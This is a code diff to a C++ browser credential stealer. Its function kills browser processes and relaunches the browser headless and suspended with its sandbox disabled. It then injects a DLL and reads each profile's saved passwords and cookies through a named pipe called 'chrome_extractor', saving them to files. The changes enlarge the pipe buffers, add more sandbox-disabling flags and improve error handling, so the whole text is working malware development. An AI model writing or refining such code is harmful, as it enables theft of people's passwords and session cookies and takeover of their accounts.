@@ -174,7 +174,7 @@ void inject_and_collect(const std::vector<unsigned char>& dll_bytes, const Brows
 
     kill_processes_by_name(browser.exe_name);
 
-    std::wstring cmd = browser.exe_name + L" --headless --disable-gpu";
+    std::wstring cmd = browser.exe_name + L" --headless --disable-gpu --no-sandbox --disable-setuid-sandbox --disable-extensions about:blank";
     std::vector<wchar_t> cmd_buf(cmd.begin(), cmd.end());
     cmd_buf.push_back(0);
 
@@ -187,7 +187,7 @@ void inject_and_collect(const std::vector<unsigned char>& dll_bytes, const Brows
     if (!success) {
         std::wstring path = find_browser_exe(browser.name);
         if (!path.empty()) {
-            std::wstring full_cmd = L"\"" + path + L"\" --headless --disable-gpu";
+            std::wstring full_cmd = L"\"" + path + L"\" --headless --disable-gpu --no-sandbox --disable-setuid-sandbox --disable-extensions about:blank";
             std::vector<wchar_t> full_cmd_buf(full_cmd.begin(), full_cmd.end());
             full_cmd_buf.push_back(0);
             success = CreateProcessW(NULL, full_cmd_buf.data(), NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
@@ -199,7 +199,7 @@ void inject_and_collect(const std::vector<unsigned char>& dll_bytes, const Brows
         return;
     }
 
-    HANDLE h_pipe = CreateNamedPipeW(L"\\\\.\\pipe\\chrome_extractor", PIPE_ACCESS_INBOUND, PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT, 1, 2 * 1024 * 1024, 2 * 1024 * 1024, 0, NULL);
+    HANDLE h_pipe = CreateNamedPipeW(L"\\\\.\\pipe\\chrome_extractor", PIPE_ACCESS_INBOUND, PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT, 1, 50 * 1024 * 1024, 50 * 1024 * 1024, 0, NULL);
     if (h_pipe == INVALID_HANDLE_VALUE) {
         std::cerr << "Failed to create named pipe. Error: " << GetLastError() << std::endl;
     }
@@ -221,11 +221,11 @@ void inject_and_collect(const std::vector<unsigned char>& dll_bytes, const Brows
             if (!buffer.empty()) {
                 std::cout << "Received " << buffer.size() << " bytes of data." << std::endl;
                 try {
+                    std::cout << "Parsing JSON data..." << std::endl;
                     auto profiles = json::parse(buffer);
                     fs::path browser_dir(browser.name);
                     fs::create_directories(browser_dir);
 
-                    std::cout << "Parsing JSON data..." << std::endl;
                     for (size_t i = 0; i < profiles.size(); ++i) {
                         std::string p_name = profiles[i]["name"].get<std::string>();
                         // Sanitize profile name for filesystem
@@ -267,12 +267,21 @@ void inject_and_collect(const std::vector<unsigned char>& dll_bytes, const Brows
                         std::cout << "[+] Saved " << profiles[i]["passwords"].size() << " passwords to: " << p_pass << std::endl;
                         std::cout << "[+] Saved " << profiles[i]["cookies"].size() << " cookies to: " << p_cook << std::endl;
                     }
-                } catch (...) {}
+                } catch (const std::exception& e) {
+                    std::cerr << "JSON Parsing error: " << e.what() << std::endl;
+                } catch (...) {
+                    std::cerr << "Unknown error during JSON parsing." << std::endl;
+                }
+            } else {
+                std::cout << "Pipe closed with no data received." << std::endl;
             }
+        } else {
+            std::cerr << "ConnectNamedPipe failed. Error: " << GetLastError() << std::endl;
         }
         CloseHandle(h_pipe);
     }
 
+    Sleep(1000); // Give the OS time to finish pipe work
     TerminateProcess(pi.hProcess, 0);
     CloseHandle(pi.hProcess);
     CloseHandle(pi.hThread);
